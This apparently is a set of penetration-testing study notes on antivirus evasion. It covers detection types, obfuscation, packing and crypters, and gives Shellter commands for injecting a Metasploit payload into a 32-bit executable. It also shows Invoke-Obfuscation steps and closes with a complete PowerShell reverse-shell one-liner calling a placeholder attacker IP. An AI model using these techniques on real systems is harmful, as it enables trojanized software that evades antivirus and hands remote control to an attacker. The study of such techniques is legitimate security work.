## AV Detection Methods
- Signature based detection
- Heuristic based detection
- Behaviour bsed detection

## On-disk evasion techniques
- Obfuscation: Reorganize code and make it harder to analyze or RE
- Encoding: Changing data into a new format
- Packing: Generate a binary with a smaller size and a new signature
- Crypter: Encrypts code or payloads and decrypts the encrypted code in memory

## In-memory evasuib techinques
- Manipulation of memory and does not write to disk
- Injects payload into a process by levaraging various Windows API
- Payload is then executed in memory in separate thread
- Using #tools/evasion/shellter
	- Can inject code into 32-bit applications
	```
	sudo dpkg --add-architecture i386
	sudo apt-get install wine32
	cd /usr/share/windows-resources/shellter
	sudo wine shellter.exe
	Auto/Manual: A
	Path: /<path>/<target_executable>
	Stealth: Y
	Payload: L
	SET LHOST
	SET LPORT


	Start msfconsole multi/handler with the same payload that was used while creating the malicious file
	```
	- The file provided is now malicious but a backup is created as well in `shellter_backup`
	- The original application will work as it is but will also run the malicious code

## Obfuscating Powershell Code
- `Invoke-Obfuscation`
```
sudo apt-get install powershell
pwsh
> cd Invoke-Obfuscation
> Import-Module ./Invodke-Obfuscation.psd1
> Invoke-Obfuscation
Invoke-Obfuscation> SET SCRIPTPATH <ps1 path>
Invoke-Obfuscation> AST
Invoke-Obfuscation\AST> All
Invoke-Obfuscation\AST\All> 1
```

The shell looks like:
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKERS_IP>',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```